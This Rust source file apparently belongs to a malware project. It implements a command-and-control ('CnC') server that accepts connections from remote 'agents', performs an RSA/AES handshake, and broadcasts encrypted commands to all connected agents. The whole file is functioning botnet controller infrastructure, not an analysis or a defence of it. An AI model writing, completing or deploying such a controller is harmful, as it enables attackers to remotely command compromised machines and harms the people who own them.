use std::collections::HashMap;
use std::io;
use std::sync::Arc;
use tokio::io::AsyncWriteExt;
// use tokio::io::{AsyncWriteExt, Interest};
use tokio::net::TcpListener;
use tokio::sync::Mutex;

use crate::crypto;
use crate::socket::{SocketState, SocketStream};
use rand::prelude::*;

pub struct Server {
    pub streams: Arc<Mutex<HashMap<i32, Arc<Mutex<SocketStream>>>>>, // or agents
    pub rsa_private_key: Vec<u8>,
}

impl Server {
    pub fn new(rsa_private_key: Vec<u8>) -> Self {
        Self {
            streams: Arc::new(Mutex::new(HashMap::new())),
            rsa_private_key,
        }
    }

    pub async fn assign_new_socket(&mut self, socket: SocketStream) {
        let streams = Arc::clone(&self.streams);
        let mut streams_lock = streams.lock().await;

        let new_socket_id = generate_random_num();

        streams_lock.insert(new_socket_id, Arc::new(Mutex::new(socket)));

        // FIRE HANDSHAKE SERVER_HELLO so we can keep on going from handle_msg.
        // let my_new_stream = Arc::clone(&streams_lock.get(&new_socket_id).unwrap().stream);
        // let mut my_new_lock = my_new_stream.lock().await;
        // my_new_lock.write_all(&b"HANDSHAKE".to_vec()).await.unwrap();
        // std::mem::drop(my_new_lock);

        self.read_new_socket(new_socket_id).await.unwrap();
    }

    pub async fn broadcast_command(&mut self, command: Vec<u8>) -> Result<(), Vec<i32>> {
        // Todo find better namings for everything here lmao
        let mut failed_broadcasts: Vec<i32> = Vec::new();
        let streams = Arc::clone(&self.streams);
        let mut streams = streams.lock().await;

        for stream in &mut *streams {
            let my_socket_stream = Arc::clone(stream.1);
            let lock = my_socket_stream.lock().await;
            let command = command.clone();

            let command = match lock.state {
                SocketState::Operational => crypto::encrypt_with_aes(
                    command,
                    lock.aes_key.as_ref().unwrap(),
                    lock.aes_nonce.as_ref().unwrap(),
                ),
                SocketState::Handshake(_) => command,
            };

            let res = lock.write_msg(&command).await;
            if res.is_err() {
                failed_broadcasts.push(*stream.0);
                continue;
            }
        }

        if failed_broadcasts.len() > 0 {
            Err(failed_broadcasts)
        } else {
            Ok(())
        }
    }

    pub async fn read_new_socket(&mut self, id: i32) -> io::Result<()> {
        // A loop which reads messages from the CnC
        // server.assign_new_stream(stream: SocketStream)
        let my_streams = Arc::clone(&self.streams);
        tokio::spawn(async move {
            loop {
                let mut streams = my_streams.lock().await;
                let socket = streams.get(&id).unwrap();

                let my_socket = Arc::clone(socket);
                let mut lock = my_socket.lock().await;
                let msg = lock.consume_message().await;

                match msg {
                    Err(e) if e.kind() == std::io::ErrorKind::ConnectionReset => {
                        println!("Agent disconnected");
                        // remove from hashmap
                        streams.remove(&id);
                        break;
                    }
                    Ok((msg, n_bytes)) => {
                        lock.handle_msg(msg, n_bytes).await;
                    }
                    _ => {}
                }
            }
        });
        Ok(())
    }
}

pub async fn start_cnc_server(ip: &str, port: u16, server: &Arc<Mutex<Server>>) -> io::Result<()> {
    let listener = TcpListener::bind(&format!("{}:{}", ip, port)).await?;
    let my_server = Arc::clone(server);

    tokio::spawn(async move {
        loop {
            let (socket, _) = listener.accept().await.unwrap();
            let socket = SocketStream::new(socket);
            let mut lock = my_server.lock().await;
            lock.assign_new_socket(socket).await;
        }
    });

    Ok(())
}

pub fn generate_random_num() -> i32 {
    let mut rng = rand::thread_rng();
    let mut nums: Vec<i32> = (1..100000).collect();
    nums.shuffle(&mut rng);
    *nums.get(0).unwrap()
}
